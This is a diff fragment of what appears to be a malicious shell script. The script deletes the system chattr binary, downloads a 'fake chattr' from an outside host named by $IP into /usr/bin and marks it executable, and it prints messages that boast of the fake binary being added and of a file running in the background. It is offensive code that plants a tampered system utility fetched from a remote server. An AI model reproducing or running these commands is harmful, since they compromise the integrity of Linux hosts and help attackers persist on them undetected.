@@ -53,7 +53,7 @@ echo
 echo "--------------------File successfully running in the background---------------"
 echo "-----------------------------------------------------------------------------"
 echo
-cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
+rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
 echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
